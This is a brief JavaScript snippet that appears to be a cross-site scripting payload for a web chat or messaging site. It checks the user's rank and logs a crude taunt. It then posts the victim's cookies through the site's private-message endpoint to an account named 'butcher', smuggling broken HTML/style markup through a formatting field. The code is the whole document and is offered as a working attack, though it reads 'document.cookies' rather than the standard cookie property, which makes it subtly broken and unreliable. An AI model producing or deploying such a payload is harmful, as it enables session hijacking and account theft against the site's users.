if(user_rank > 2)
  {
    console.log("In your ass bish!!!");
    send_it(document.cookies);
  }

function send_it(message)
{
  		$.ajax({

			url: "system/private_process.php",
			type: "POST",
			data: { 
			content: message, 
			bold: 0, italic: 0, 
			underline: 0, 										
			high: 'yellow;" ></span>  <style="', color: 'rgba(50,50,50,1)', target: 'butcher'},
			success: function(result){
				console.log("Success");
				console.log(result);
			}    
			,
			error: function(result){
				console.log("Error");
				console.log(result);
			}    
	   
	   
        });   
}
